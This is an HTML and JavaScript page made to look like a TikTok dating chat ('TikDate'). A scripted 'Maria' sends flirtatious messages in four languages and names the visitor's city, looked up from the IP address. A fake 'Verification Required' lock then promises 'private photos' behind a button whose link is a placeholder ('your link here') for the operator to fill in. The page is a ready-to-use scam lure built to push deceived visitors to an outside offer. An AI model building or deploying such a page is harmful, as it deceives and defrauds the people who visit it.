<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>TikDate | Chat</title>
  <style>
    :root {
      --primary-color: #fe2c55;
      --tiktok-black: #121212;
      --bg-blur: rgba(255, 255, 255, 0.9);
    }

    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'ProximaNova', sans-serif, Arial; background: #000; overflow: hidden; }

    /* TikTok UI Elements */
    .video-background {
      position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1;
    }
    .video-background video { width: 100%; height: 100%; object-fit: cover; }

    .side-buttons {
      position: fixed; right: 10px; bottom: 150px; z-index: 2;
      display: flex; flex-direction: column; gap: 20px; align-items: center;
    }
    .side-icon { width: 40px; height: 40px; opacity: 0.9; }

    /* Chat Overlay */
    #chat-overlay {
      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(12px);
      -webkit-backdrop-filter: blur(12px); z-index: 10000;
      display: flex; align-items: center; justify-content: center;
    }

    .chat-window {
      width: 90%; max-width: 380px; height: 80vh;
      background: #fff; border-radius: 24px;
      display: flex; flex-direction: column; overflow: hidden;
      box-shadow: 0 20px 40px rgba(0,0,0,0.4);
    }

    .chat-header {
      padding: 15px 20px; border-bottom: 1px solid #eee;
      display: flex; align-items: center; justify-content: space-between;
    }
    .user-info { display: flex; align-items: center; }
    .chat-avatar {
      width: 44px; height: 44px; border-radius: 50%;
      border: 2px solid var(--primary-color); padding: 2px; margin-right: 12px;
    }
    .chat-name { font-weight: 700; font-size: 16px; color: #000; }
    .status { font-size: 12px; color: #4caf50; display: flex; align-items: center; }
    .status::before { content: ''; width: 8px; height: 8px; background: #4caf50; border-radius: 50%; margin-right: 5px; }

    .chat-messages {
      flex: 1; padding: 20px; overflow-y: auto;
      background: #fcfcfc; display: flex; flex-direction: column; gap: 12px;
    }

    .msg {
      max-width: 85%; padding: 12px 16px; border-radius: 18px;
      font-size: 15px; line-height: 1.4; animation: slideUp 0.3s ease;
    }
    .msg.received { background: #f1f1f2; color: #161823; align-self: flex-start; border-bottom-left-radius: 4px; }
    
    @keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

    /* Typing Indicator */
    .typing { font-size: 12px; color: #8a8b91; margin-left: 5px; display: none; }

    /* Lock Section */
    .lock-block {
      padding: 25px; text-align: center; background: #fff;
      border-top: 1px solid #eee; display: none;
    }
    .lock-icon { width: 50px; margin-bottom: 15px; }
    .lock-title { font-weight: 800; font-size: 18px; margin-bottom: 10px; }
    .lock-text { font-size: 14px; color: #616161; margin-bottom: 20px; }

    .verify-btn {
      background: var(--primary-color); color: #fff; text-decoration: none;
      display: block; padding: 16px; border-radius: 12px;
      font-weight: 700; font-size: 16px; text-transform: uppercase;
      box-shadow: 0 4px 15px rgba(254, 44, 85, 0.3);
      animation: pulse 1.5s infinite;
    }

    @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.03); } 100% { transform: scale(1); } }
  </style>
</head>
<body>

  <div class="video-background">
    <video src="./assets/files/video.mp4" loop playsinline autoplay muted></video>
    <div class="side-buttons">
        <img src="https://cdn-icons-png.flaticon.com/512/1077/1077035.png" class="side-icon" style="filter: invert(1);">
        <img src="https://cdn-icons-png.flaticon.com/512/2462/2462719.png" class="side-icon" style="filter: invert(1);">
        <img src="https://cdn-icons-png.flaticon.com/512/1358/1358023.png" class="side-icon" style="filter: invert(1);">
    </div>
  </div>

  <div id="chat-overlay">
    <div class="chat-window">
      <div class="chat-header">
        <div class="user-info">
          <img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?auto=format&fit=crop&w=100&q=80" class="chat-avatar">
          <div>
            <div class="chat-name" id="name-label">Maria</div>
            <div class="status" id="status-label">Online</div>
          </div>
        </div>
      </div>

      <div class="chat-messages" id="chat-box">
        <!-- Messages appear here -->
      </div>
      
      <div class="typing" id="typing-ui">...печатает</div>

      <div id="lock-container" class="lock-block">
        <img src="https://cdn-icons-png.flaticon.com/512/709/709612.png" class="lock-icon">
        <div class="lock-title" id="lock-title">Verification Required</div>
        <div class="lock-text" id="lock-text">To prevent spam, please confirm you are a real user to send messages.</div>
        <a href="ТВОЯ_ССЫЛКА_ТУТ" class="verify-btn" id="btn-text">VERIFY & REPLY</a>
      </div>
    </div>
  </div>

  <script>
    // 1. Система переводов
    const translations = {
      ru: {
        name: "Мария",
        status: "В сети",
        typing: "Мария печатает...",
        city_fallback: "твоего города",
        msg1: "Привет! 👋 Ты тоже из <b>{city}</b>?",
        msg2: "Я тут совсем недавно, ищу с кем пообщаться... Свободен сегодня? 😊",
        lockTitle: "Проверка безопасности",
        lockText: "Чтобы ответить Марии и увидеть её скрытые фото, подтвердите, что вы реальный человек.",
        btn: "ПОДТВЕРДИТЬ И ОТВЕТИТЬ"
      },
      en: {
        name: "Maria",
        status: "Online",
        typing: "Maria is typing...",
        city_fallback: "your city",
        msg1: "Hey! 👋 Are you also from <b>{city}</b>?",
        msg2: "I'm new here, looking for someone to talk to... Are you free tonight? 😊",
        lockTitle: "Safety Verification",
        lockText: "To reply to Maria and see her private photos, please verify that you are a real person.",
        btn: "VERIFY & REPLY"
      },
      de: {
        name: "Maria",
        status: "Online",
        typing: "Maria schreibt...",
        city_fallback: "deiner Stadt",
        msg1: "Hey! 👋 Kommst du auch aus <b>{city}</b>?",
        msg2: "Ich bin neu hier und suche jemanden zum Reden... Hast du heute Zeit? 😊",
        lockTitle: "Sicherheitsprüfung",
        lockText: "Um Maria zu antworten und ihre privaten Fotos zu sehen, bestätige bitte, dass du eine echte Person bist.",
        btn: "BESTÄTIGEN & ANTWORTEN"
      },
      es: {
        name: "María",
        status: "En línea",
        typing: "María está escribiendo...",
        city_fallback: "tu ciudad",
        msg1: "¡Hola! 👋 ¿Tú también eres de <b>{city}</b>?",
        msg2: "Soy nueva aquí, busco a alguien con quien hablar... ¿Estás libre hoy? 😊",
        lockTitle: "Verificación de seguridad",
        lockText: "Para responder a María y ver sus fotos privadas, confirma que eres una persona real.",
        btn: "CONFIRMAR Y RESPONDER"
      }
    };

    // 2. Определение языка
    const userLang = navigator.language.split('-')[0] || 'en';
    const lang = translations[userLang] || translations.en;

    // Заполнение статики
    document.getElementById('name-label').innerText = lang.name;
    document.getElementById('status-label').innerText = lang.status;
    document.getElementById('typing-ui').innerText = lang.typing;
    document.getElementById('lock-title').innerText = lang.lockTitle;
    document.getElementById('lock-text').innerText = lang.lockText;
    document.getElementById('btn-text').innerText = lang.btn;

    async function startChat() {
      const chatBox = document.getElementById('chat-box');
      const typingUi = document.getElementById('typing-ui');
      const lock = document.getElementById('lock-container');
      
      let city = lang.city_fallback;
      
      // Гео-определение
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        if(data.city) city = data.city;
      } catch(e) { console.log("Geo error"); }

      const addMessage = (text, delay) => {
        return new Promise(resolve => {
          typingUi.style.display = 'block';
          chatBox.scrollTop = chatBox.scrollHeight;
          
          setTimeout(() => {
            typingUi.style.display = 'none';
            const div = document.createElement('div');
            div.className = 'msg received';
            div.innerHTML = text.replace('{city}', city);
            chatBox.appendChild(div);
            chatBox.scrollTop = chatBox.scrollHeight;
            resolve();
          }, delay);
        });
      };

      // Сценарий чата
      await new Promise(r => setTimeout(r, 1000));
      await addMessage(lang.msg1, 2000);
      await new Promise(r => setTimeout(r, 1000));
      await addMessage(lang.msg2, 2500);

      // Показ блокировки
      setTimeout(() => {
        lock.style.display = 'block';
        chatBox.scrollTop = chatBox.scrollHeight;
      }, 1000);
    }

    window.addEventListener('load', () => {
      setTimeout(startChat, 1500);
    });
  </script>
</body>
</html>
